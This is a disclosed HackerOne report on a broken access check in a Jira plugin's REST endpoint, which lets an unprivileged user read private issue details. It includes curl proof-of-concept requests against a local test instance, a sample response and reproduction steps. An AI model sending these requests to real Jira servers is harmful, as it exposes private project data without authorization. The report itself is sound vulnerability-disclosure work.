---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1099489'
original_report_id: '1099489'
title: REST API Endpoint leads to Unauthorized user disclosed private [ issue ] details
weakness: Privilege Escalation
team_handle: mailru
created_at: '2021-02-09T17:41:45.237Z'
disclosed_at: '2021-11-06T18:48:10.501Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 23
asset_identifier: Ext. A Scope
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# REST API Endpoint leads to Unauthorized user disclosed private [ issue ] details

## Metadata

- HackerOne Report ID: 1099489
- Weakness: Privilege Escalation
- Program: mailru
- Disclosed At: 2021-11-06T18:48:10.501Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary
Jira allows an administrator to restrict access to projects to specific users only. Or adjusting all project properties to be available only to the system administrator, which means that all users in the jira account cannot access issues, project, dashboard and any information about the project, view, modify, delete or add to the project, or even Conf. for the apps associated with this project. So, After install and analyzing the  [Query Issues Custom Fields](https://marketplace.atlassian.com/apps/1211009/query-issues-custom-fields?hosting=server&tab=overview) source code I found several endpoints. some of this endpoint Leads Unauthorized user access to disclose private data.

# Description:
After installing and analyze the source code [Query Issues Custom Fields](https://marketplace.atlassian.com/apps/1211009/query-issues-custom-fields?hosting=server&tab=overview), I headed to the next file

`
Query Issues Custom Fields/ru/mail/jira/plugins/lf/queryfields/js/linker-field-app.js
`

When looking for endpoints in this file, you find the next endpoint: ` /rest/queryfields/1.0/customfields/linkerfield/option?issueKey=`

```js 
E = function () {
                    function e(e, t, n, a, i, l, r) {
                        var c = this;
                        this.hasError = !1, this.isLoading = !1, this.changeLoadingState = function (e) {
                            c.isLoading = e
                        }, this.loadValue = function () {
                            c.isLoading = !0, null == c.issueKey || 0 == c.issueKey.length ? O.a.get(b()() + "/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=" + c.defaultValue).then(Object(p.action)((function (e) {
                                c.value = e.data
                            }))).catch().finally((function () {
                                return c.changeLoadingState(!1)
....
```

As the parameter name indicates, it takes a value for `issueKey=` so I created a new case and copied the issue keyID and added it to the endpoint.
`{BaseUrl}/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=PRJ-1` And as it appears in the `.js` code, this request is sent through the GET Request `O.a.get(b()()`, so I sent this request using the administrator's account and the response contains the case information

```bash
curl  -X GET -u admin:admin "http://localhost:8080/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=PRJ-1"
```

## Response 

```json
{
   "key":"PRJ-2",
   "summary":"As a product owner, I'd like to express work in terms of actual user problems, aka User Stories, and place them in the backlog ... etc",
   "description":"When you click  Create Issue....etc",
   "issueType":"Story",
   "issueTypeIconUrl":"/images/icons/issuetypes/story.svg",
   "status":"To Do",
   "statusColor":"blue-gray",
   "priority":"Medium",
   "priorityIconUrl":"/images/icons/priorities/medium.svg",
   "assignee":{
      "displayName":"Unassigned"
   },
   "deleted":false,
   "customFields":[
      
   ]
}
```

Then I created the account for user B and from the administrator account restricted the access of the user so that it would not have any permissions. This means that User B cannot access projects, cases, dashboards, or anything with userB account. Using User B's account, I resubmitted the previous request, and it turned out that the request was not protected as the user was able to access all the issues information

```bash
curl  -X GET -u user:user "http://localhost:8080/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=PRJ-1"
```

In this case, User B can disclose private information about all issues in the `jira account` that he is supposed to not reach by sending the following request:

### Steps:

1. Create Jira account.
1. Create Jira user with no_permissions.
1. The administrator limits access to the project only to the administrator.

{F1189720}
1. Admin install  [Query Issues Custom Fields](https://marketplace.atlassian.com/apps/1211009/query-issues-custom-fields?hosting=server&tab=overview). 
1. using the user with no permission, call:

```bash
curl  -X GET -u user:user "http://localhost:8080/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=PRJ-1"
```

Best,
* Jafar

## Impact

REST API Endpoint leads to Unauthorized user disclosed private [ issue ] details

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
